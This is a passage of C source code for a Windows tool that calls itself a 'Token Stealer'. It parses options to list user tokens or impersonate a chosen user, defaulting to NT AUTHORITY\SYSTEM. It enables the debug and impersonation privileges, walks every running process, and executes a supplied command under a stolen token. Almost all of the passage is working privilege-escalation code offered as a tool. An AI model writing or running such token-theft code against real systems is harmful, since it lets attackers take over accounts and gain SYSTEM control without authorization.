	if (!AddTheAceDesktop(hdesk, psid))
		printf("[-] Error add Ace desktop:%d\n", GetLastError());
	//free(psid);
	CloseWindowStation(hwinsta);

	CloseDesktop(hdesk);
}

void usage()
{
	printf("[!] Usage:\n");
	printf("\t -l: list all users token\n");
	printf("\t -e: list all users token with extended info -> <user>:<token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>:<pid>\n");
	printf("\t -p: users token from specfic  process pid\n");
	printf("\t -u: impersonate token of user <user>\n");
	printf("\t -c: command to execute with token\n");
	printf("\t -t: force use of impersonation Privilege\n");
	
	printf("\t -b: needed token type: 1=Primary,2=Impersonation,3=Delegation\n");

}
int wmain(int argc, WCHAR* argv[])
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	
	
	ULONG handleInfoSize = 0x10000;
	ULONG pid = 0;
	HANDLE processHandle = NULL;
	
	HANDLE hObject = NULL;
	
	
	
	

	HANDLE dupHandle = NULL;
	
	
	
	
	
	
	wchar_t* command = NULL;
	BOOL list_mode = FALSE;
	BOOL extended_list = FALSE;
	int cnt = 1;
	printf("[+] My personal simple and stupid  Token Stealer... ;)\n");
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{

		{
			switch (argv[cnt][1])
			{
			case 'c':
				++cnt;
				--argc;
				command = argv[cnt];
				break;
			case 'b':
				++cnt;
				--argc;
				TokenTypeNeeded = _wtoi(argv[cnt]);
				
				break;
			case 'p':
				++cnt;
				--argc;
				pid = _wtoi(argv[cnt]);
				break;
			case 'u':
				++cnt;
				--argc;
				User_to_impersonate = argv[cnt];
				break;
			case 't':
				ForceImpersonation = TRUE;

				break;
			case 'e':
				extended_list = TRUE;

				list_mode = TRUE;
				break;

			case 'l':
				list_mode = TRUE;

				break;
			case 'h':
				usage();
				exit(0);
				break;
			default:
				printf("Wrong Argument: %ls\n", argv[1]);
				usage();
				exit(-1);
			}

			++cnt;
			--argc;
		}
	}

	if (command == NULL && !list_mode) {
		usage();
		return 1;
	}


	SetWinDesktopPerms();
	HANDLE hToken;
	OpenProcessToken(GetCurrentProcess(),
		TOKEN_ALL_ACCESS, &hToken);
	

	HasAssignPriv = EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
	EnablePriv(hToken, SE_IMPERSONATE_NAME);
	EnablePriv(hToken, SE_DEBUG_NAME);
	if (User_to_impersonate == NULL)
		User_to_impersonate = (wchar_t*)L"NT AUTHORITY\\SYSTEM";
	
	if (pid == 0)
	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		BOOL b;
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			return 1;
		}


	

		cProcesses = cbNeeded / sizeof(DWORD);

	

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{

				if (list_mode)

					ListTokens(aProcesses[i], extended_list);
				else
				{

					b = ExecuteWithToken(command, aProcesses[i]);
					
					if (b)
					{
						printf("ProcessId:%d\n", aProcesses[i]);
						break;
					}
				}
			}
		}
		
		if (list_mode)
		{
			printf("Total unique items:%d\n\n", num_TokenUsers);
			for (int i = 0; i < num_TokenUsers; i++)
			{
				printf("%S\n", TokenUsers[i]);
			}
		}

	}
	else
	{

		if (list_mode)

		{
			ListTokens(pid, extended_list);
			printf("Total unique users:%d\n", num_TokenUsers);
			for (int i = 0; i < num_TokenUsers; i++)
			{
				printf("%S\n", TokenUsers[i]);
			}
		}
		else
			ExecuteWithToken(command, pid);

	}
	return 0;
}

